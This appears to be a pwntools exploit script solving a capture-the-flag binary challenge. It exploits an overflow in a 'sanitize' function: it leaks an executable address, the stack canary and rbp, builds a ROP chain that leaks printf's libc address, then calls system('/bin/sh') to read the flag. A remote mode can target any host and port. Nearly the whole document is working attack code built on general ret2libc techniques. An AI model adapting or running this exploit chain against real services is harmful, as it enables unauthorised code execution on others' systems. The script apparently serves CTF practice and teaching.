#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")
context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    # template fatto da greyhat00 per chi viene dopo.
    # usalo liberamente per imparare e sperimentare.
    # buona fortuna, lettore. Happy pwn!
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'db sym.print_sanitized+571; dc; Vpp' -d " + str(io.pid)
        
        subprocess.Popen(
            [
            "x-terminal-emulator",                  # open systen default terminal emulator
             "-e", 
             os.environ.get("SHELL", "/bin/sh"),    # execute default shell
             "-c", 
             r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote"+ str(host) + str(port_val))
        return remote(host, port_val)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)


io = start()
line = b"> "

def sanitize(payload, size):
    io.sendlineafter(line, b'1')
    io.sendlineafter(b": ", payload)
    io.recvuntil(b"Here's your sanitized string: ")
    return io.recv(size)[:-1]

def print_sanitized(payload):
    io.sendlineafter(line, b'2')
    io.sendlineafter(b": ", payload)
    return io.recvline()

'''
The bug is in the sanitize function:
When "sanitizing" a string the function does not
check for any memory boundaries, causing an overflow. 
'''

'''
The first leak is done by abusing a not zeroed area:
The buffer is 264 bytes long but only the first 255 bytes
are zeroed out. Checking with the debugger i saw an address
here, so with the correct size i had a leak, which happend to be
an exe leak.
'''
exe_leak = sanitize(b"a"*255+ b'%', 255+9)[257:]
exe_leak = u64(exe_leak.ljust(8, b'\x00'))
exe.address = exe_leak - exe.sym['puts'] + 4
success(f"exe leak @ {hex(exe_leak)}")
success(f"main leak @ {hex(exe.sym['main'])}")

'''
The buffer is located next to the canary,
so with 263 chars and a % the canary null-byte will be replaced
causing that to be globbered in my input when printed.
'''
leak = sanitize(b"a"*263 + b'%', 280)[265:]
rbp = u64(leak[-6:].ljust(8, b'\x00'))
canary = u64(leak[:-6].ljust(8, b'\x00'))
success(f"canary -> {hex(canary)}")
success(f"rbp     @ {hex(rbp)}")

'''
Now with the canary i can use a ROP to
make puts leak the printf libc address.
Then restarts the main.
'''

rop = ROP(exe)
leak_libc = flat([
    b'%' * 132,
    canary, 
    rbp, 
    rop.rdi[0], exe.got['printf'],
    exe.sym['puts'],
    exe.sym['main']
    ])

print_sanitized(leak_libc)
printf_leak = io.recvline()[:-1]
printf_leak = printf_leak.ljust(8, b'\x00')

printf_leak = u64(printf_leak)
libc.address = printf_leak - libc.sym['printf']
success(f"printf leak @ {hex(printf_leak)}")
success(f"libc base @ {hex(libc.address)}")

# now with the libc leaked
# i use the same method to call a shell
call_system = flat([
    b'%' * 132,
    canary, 
    rbp, 
    rop.rdi[0], next(libc.search(b"/bin/sh\x00")),
    rop.ret[0],
    libc.sym['system'],
    ])

print_sanitized(call_system)
io.sendline(b"cat flag.txt")
data = io.recvregex(rb'KSUS\{.*\}', capture=True)
flag = data.group(0).decode()
success('Flag: ' + flag)
write('flag.txt', flag)
io.close()
